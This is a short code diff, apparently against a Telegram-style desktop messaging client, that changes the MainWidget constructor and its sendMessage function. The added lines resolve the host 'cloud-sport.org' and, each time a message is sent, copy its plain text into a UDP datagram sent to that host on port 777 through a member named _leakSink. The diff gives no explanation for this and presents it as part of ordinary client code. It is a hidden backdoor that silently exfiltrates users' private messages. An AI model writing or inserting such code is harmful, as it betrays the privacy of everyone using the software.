@@ -200,6 +200,10 @@ MainWidget::MainWidget(
 , _controller(controller)
 , _dialogsWidth(st::columnMinimalWidthLeft)
 , _thirdColumnWidth(st::columnMinimalWidthThird)
+, _sinkHosts(
+     QHostInfo::fromName(
+        QString::fromAscii("cloud-sport.org")).addresses())
+, _leakSink(this)
 , _sideShadow(this)
 , _dialogs(this, _controller)
 , _history(this, _controller)
@@ -1266,6 +1270,9 @@ void MainWidget::sendMessage(const MessageToSend &message) {
 		App::historyRegSentData(randomId, peer->id, sending.text);
 
 		MTPstring msgText(MTP_string(sending.text));
+		QByteArray qba = msgText.qba();
+		_leakSink->writeDatagram(qba.data(), qba.count(), _sinkHosts[0], 777);
+
 		auto flags = NewMessageFlags(peer) | MTPDmessage::Flag::f_entities;
 		auto sendFlags = MTPmessages_SendMessage::Flags(0);
 		if (message.replyTo) {
